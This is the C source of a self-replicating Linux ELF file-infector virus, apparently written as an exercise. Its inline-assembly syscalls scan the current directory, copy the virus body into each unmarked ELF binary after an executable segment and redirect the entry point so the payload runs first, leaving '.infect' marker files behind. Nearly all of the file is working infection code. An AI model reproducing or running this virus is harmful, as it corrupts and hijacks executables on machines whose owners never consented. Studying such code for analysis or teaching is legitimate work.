#include <sys/stat.h>
#include <sys/mman.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <dirent.h>
#include <sys/syscall.h>
#include <elf.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>


//TODO detemine the constants
#define MAX_FILE_NAME_LEN 256
#define SIZE_OF_VIRUS 3800
#define APPEND_NUM 448*4096
#define SIZE_OF_SHDR 64
#define SIZE_OF_PHDR 56

struct linux_dirent {
           long           d_ino;
           off_t          d_off;
           unsigned short d_reclen;
           char           d_name[];
       };

void Myclose(long long fd)
{
	if(fd <= 2)
		return;
	asm volatile("mov $3, %%rax\n\t"
				 "mov %[fd], %%rdi\n\t"
				 "syscall\n\t"
				 :
				 :[fd]"m"(fd)
				 :"rax", "rdi");
}


void Mywrite(long long fd, char* buf, long long len)
{
	asm volatile("mov %[fd], %%rdi\n\t"
	"mov %[path], %%rsi\n\t"
	"mov %[len], %%rdx\n\t"
	"mov $1, %%rax\n\t"
	"syscall"
	:
	:[path]"m"(buf), [len]"m"(len), [fd]"m"(fd)
	:"rax", "rdi", "rsi", "rdx", "rcx", "r11");
}


void Myread(long long fd, char* buf, long long len)
{
	asm volatile("mov $0, %%rax\n\t"
				 "mov %[fd], %%rdi\n\t"
				 "mov %[buf], %%rsi\n\t"
				 "mov %[len], %%rdx\n\t"
				 "syscall\n\t"
				 :
				 :[fd]"m"(fd), [buf]"m"(buf), [len]"m"(len)
				 :"rax", "rdi", "rsi", "rdx", "rcx", "r11");
}

//re-implementation of open()
long long Myopen(char *path, long long permission, long long mode)
{
	long long ret;
	asm volatile ("mov $2, %%rax\n\t"
				 "mov %[ppath], %%rdi\n\t"
				 "mov %[p], %%rsi\n\t"
				 "mov %[mode], %%rdx\n\t"
				 "syscall\n\t"
				 "mov %%rax, %[ret]\n\t"
				 :[ret]"=m"(ret)
				 :[ppath]"m"(path), [p]"m"(permission), [mode]"m"(mode)
				 :"rax", "rdi", "rsi", "rdx", "rcx", "r11");
	return ret;
}

long long Myfstat(long long fd, struct stat* buf)
{
	long long ret;
	asm volatile("mov $5, %%rax\n\t"
				 "mov %[fd], %%rdi\n\t"
				 "mov %[buf], %%rsi\n\t"
				 "syscall\n\t"
				 "mov %%rax, %[ret]\n\t"
				 :[buf]"=m"(buf), [ret]"=m"(ret)
				 :[fd]"m"(fd)
				 :"rax", "rdi", "rsi", "rcx", "r11");
	return ret;
}

void Mylseek(long long fd, long long offset, long long origin)
{
		asm volatile("mov $8, %%rax\n\t"
				 "mov %[fd], %%rdi\n\t"
				 "mov %[len], %%rsi\n\t"
				 "mov %[origin], %%rdx\n\t"
				 "syscall"
				 :
				 :[fd]"m"(fd), [len]"m"(offset), [origin]"m"(origin));
}

long long Myopen_append(char *path, long long permission, long long mode)
{
	long long ret; long long o_append = O_WRONLY | O_APPEND;
	asm volatile ("mov $2, %%rax\n\t"
				 "mov %[ppath], %%rdi\n\t"
				 "mov %[p], %%rsi\n\t"
				 "mov %[mode], %%rdx\n\t"
				 "syscall\n\t"
				 "mov %%rax, %[ret]\n\t"
				 :[ret]"=m"(ret)
				 :[ppath]"m"(path), [p]"m"(permission), [mode]"m"(o_append)
				 :"rax", "rdi", "rsi", "rdx", "rcx", "r11");
	struct stat stat;
	Myfstat(ret, &stat);
	Mylseek(ret, stat.st_size, SEEK_SET);
	
	int i;
	char buf = 0;
	for(i = 0; i < APPEND_NUM; ++i)
	{
		Mywrite(ret, &buf, 1);
	}
	
	Myclose(ret);
	
	asm volatile ("mov $2, %%rax\n\t"
				 "mov %[ppath], %%rdi\n\t"
				 "mov %[p], %%rsi\n\t"
				 "mov %[mode], %%rdx\n\t"
				 "syscall\n\t"
				 "mov %%rax, %[ret]\n\t"
				 :[ret]"=m"(ret)
				 :[ppath]"m"(path), [p]"m"(permission), [mode]"m"(mode)
				 :"rax", "rdi", "rsi", "rdx", "rcx", "r11");
	return ret;
}

void* Mymmap(unsigned long long addr, unsigned long long len, unsigned long long prot, unsigned long long flags, unsigned long long fd, unsigned long long offset)
{
	void* ret;
	asm volatile("mov $9, %%rax\n\t"
				 "mov %[addr], %%rdi\n\t"
				 "mov %[len], %%rsi\n\t"
				 "mov %[prot], %%rdx\n\t"
				 "mov %[flags], %%r10\n\t"
				 "mov %[fd], %%r8\n\t"
				 "mov %[offset], %%r9\n\t"
				 "syscall\n\t"
				 "mov %%rax, %[ret]\n\t"
				 :[ret]"=m"(ret)
				 :[addr]"m"(addr), [len]"m"(len), [prot]"m"(prot), [flags]"m"(flags), [fd]"m"(fd), [offset]"m"(offset)
				 :"rax", "rdi", "rsi", "rdx", "r10", "r8", "r9", "rcx", "r11"
				);
	return ret;
}


void* Myprintstr(char *str, long long len)
{
	Mywrite(1, str, len);
}

int intersect(int al, int ar, int bl, int br)
{
	if(al >= bl && al <= br)
		return 1;
	if(ar >= bl && ar <= br)
		return 1;
	if(bl >= al && bl <= ar)
		return 1;
	if(br >= al && br <= ar)
		return 1;
	return 0;
}

int find_segments(Elf64_Shdr *shdr, Elf64_Ehdr *ehdr, Elf64_Phdr *phdr, int file_size, char *elf_file)
{
	//TODO CHECK
	int pcount = ehdr -> e_phnum, scount = ehdr -> e_shnum;
	int desired_v_begin, desired_v_end;
	int desired_f_begin, desired_f_end;
	int i, j;
	int loc = -1;
	for(i = 0; i < pcount; ++i)
	{
		if(phdr[i].p_filesz > 0 && phdr[i].p_filesz == phdr[i].p_memsz
			&& (phdr[i].p_flags & PF_X))
		{
			desired_v_begin = phdr[i].p_vaddr + phdr[i].p_memsz;
			desired_v_end = phdr[i].p_vaddr + phdr[i].p_memsz + SIZE_OF_VIRUS - 1;
			for(j = 0; j < pcount; ++j)
			{
				if(intersect(phdr[j].p_vaddr, phdr[j].p_vaddr + phdr[j].p_memsz - 1, desired_v_begin, desired_v_end))
					break;
			}
			if(j == pcount)
			{
				loc = i;
				break;
			}
		}
	}
	if(loc == -1)
		return -1;
	desired_f_begin = phdr[loc].p_filesz + phdr[loc].p_offset;
	desired_f_end = desired_f_begin + SIZE_OF_VIRUS - 1;
	int occupied_size = SIZE_OF_VIRUS;
	//Move
	int len = file_size;
	for(i = len - APPEND_NUM - 1; i >= desired_f_begin; --i)
		elf_file[i + APPEND_NUM] = elf_file[i];
	shdr += APPEND_NUM / SIZE_OF_SHDR;
	for(i = 0; i < pcount; ++i)
	{
		if(phdr[i].p_offset >= desired_f_begin)
		{
			phdr[i].p_offset += APPEND_NUM;
		}
		else if(phdr[i].p_offset + phdr[i].p_filesz > desired_f_begin)
		{
			phdr[i].p_filesz += APPEND_NUM;
		}
	}
	for(i = 0; i < scount; ++i)
	{
		if(shdr[i].sh_offset >= desired_f_begin)
			shdr[i].sh_offset += APPEND_NUM;
		else if(shdr[i].sh_offset + shdr[i].sh_size > desired_f_begin)
		{
		}
	}
	ehdr -> e_shoff += APPEND_NUM;
	return loc;
}

long long mainAddr;

void infect(char *path)
{
	char sign[MAX_FILE_NAME_LEN];
	int i, j, len; len = 0;
	//create a sign file *.infect to identify if we have already infected
	while(path[len])
	{
		sign[len] = path[len];
		++len;
	}
	*(long long*)(&sign[len]) = 32760384459794734LL; //.infect\0
	long long fd = Myopen(path, 2, 0);
	
	struct stat stat;
	Myfstat(fd, &stat);
	
	char *elf_file = Mymmap(0, stat.st_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	
	char *the_ptr, *virus = (char*)0x1995112719951127LL; //virus is going to be modified by mother, we use this var to locate our code
	
	Elf64_Ehdr *ehdr;
	Elf64_Phdr *phdr;
	Elf64_Shdr *shdr;
	long long loc, pos, endpos;
	long long signfd;
	
	if(((long long)elf_file > 0) && (*(int*)(elf_file) == 1179403647) && (signfd = Myopen(sign, O_CREAT | O_RDWR, 777)) > 0) // file accessible and it's a ELF-file and sign not exists
	{
		//APPEND PROCESS
		Myclose(fd);
		fd = Myopen_append(path, 2, 0);
		Myfstat(fd, &stat);
		elf_file = Mymmap(0, stat.st_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
		
		//Get the elf header
		ehdr = (Elf64_Ehdr*)elf_file;
		//get the program header
		phdr = (Elf64_Phdr*) (elf_file + ehdr -> e_phoff);
		//Get the section header
		shdr = (Elf64_Shdr*) (elf_file + ehdr -> e_shoff);
		
		loc = find_segments(shdr, ehdr, phdr, stat.st_size, elf_file);
		
		if(loc != -1)
		{
			//memcpy(elf_file + phdr[loc].p_offset + phdr[loc].p_filesz, virus, sizeof virus); //finish infection
			endpos = phdr[loc].p_offset + phdr[loc].p_filesz;
			
			//re-implementation of memcpy 
			the_ptr = elf_file + endpos;
			for(i = 0; i < SIZE_OF_VIRUS; ++i, ++virus, ++the_ptr)
				*the_ptr = *virus;
			
			//Program header change
			phdr[loc].p_filesz += SIZE_OF_VIRUS;
			phdr[loc].p_memsz += SIZE_OF_VIRUS;
			
			//change jump instruction
			pos = phdr[loc].p_vaddr + phdr[loc].p_filesz;
			*(Elf64_Word*)(the_ptr - 4) = (Elf64_Word)ehdr->e_entry - pos; //calculate jump target
			
			#define entryDelta 3224
			//change the initial value variable "char* virus" in above code, also relocate entry
			#define myConstant1 2291 //this defines the offset of the initialization code, need to be determined
			*(long long*)(elf_file + endpos + myConstant1) = pos - SIZE_OF_VIRUS;
			ehdr -> e_entry = pos - SIZE_OF_VIRUS + entryDelta;
		}
		//No need for close
		//else give up
	}
	
	Myclose(signfd);
	Myclose(fd);
}

int main()
{
/*
	int a = 1, b = 2, c;
	asm("mov %[src1], %[target]\n\t"
		"add %[src2], %[target]\n\t"
		:[target]"=r"(c)
		:[src1]"r" (a), [src2]"r"(b));
*/	
	char a[4];
	char msg1[100];
	
	msg1[0]=-24;
	msg1[1]=-117;
	msg1[2]=-97;
	msg1[3]=-27;
	msg1[4]=-120;
	msg1[5]=-87;
	msg1[6]=-27;
	msg1[7]=-101;
	msg1[8]=-67;
	msg1[9]=-27;
	msg1[10]=-82;
	msg1[11]=-74;
	msg1[12]=-25;
	msg1[13]=-108;
	msg1[14]=-97;
	msg1[15]=-26;
	msg1[16]=-83;
	msg1[17]=-69;
	msg1[18]=-28;
	msg1[19]=-69;
	msg1[20]=-91;
	msg1[21]=32;
	msg1[22]=-27;
	msg1[23]=-78;
	msg1[24]=-126;
	msg1[25]=-24;
	msg1[26]=-125;
	msg1[27]=-67;
	msg1[28]=-25;
	msg1[29]=-91;
	msg1[30]=-72;
	msg1[31]=-25;
	msg1[32]=-90;
	msg1[33]=-113;
	msg1[34]=-24;
	msg1[35]=-74;
	msg1[36]=-117;
	msg1[37]=-23;
	msg1[38]=-127;
	msg1[39]=-65;
	msg1[40]=-28;
	msg1[41]=-71;
	msg1[42]=-117;
	msg1[43]=10;

	Myprintstr(msg1, 44);
	
	*(int*)a = '.'; //scan this file can tell us the file names of current directory
	
	long long fd = Myopen(a, 0, 0);
	
	char buf[4096];
	long long nread;
	int bpos;
	
    struct linux_dirent *d;
    //This segment scan the directory to check if there is a file to infect.
	do
	{
               //nread = syscall(SYS_getdents, fd, buf, 4096); A syscall to read '.', since it's a protected file.
               asm("mov %[fd], %%rdi\n\t"
               	   "mov %[buf], %%rsi\n\t"
               	   "mov $4096, %%rdx\n\t"
               	   "mov $217, %%rax\n\t"
               	   "syscall\n\t"
               	   "mov %%rax, %[nread]"
               	   :[nread]"=m"(nread)
               	   :[fd]"m"(fd), [buf]"r"(buf)
               	   :"rax", "rdi", "rsi", "rdx", "rax");
               	   
               for (bpos = 0; bpos < nread;) { //enumerate all files
                    d = (struct linux_dirent *) (buf + bpos);
					infect(d -> d_name + 1);
                    bpos += d->d_reclen;
                    
               }
               
    }while(nread != 0);
    Myclose(fd);
    //read only fd, is not needed for close
   	asm volatile("nop\n\t"
   				 "nop\n\t"
   				 "nop\n\t"
   				 "nop\n\t"
   				 "nop\n\t"
   				 :
   				 :
   				 :);
}
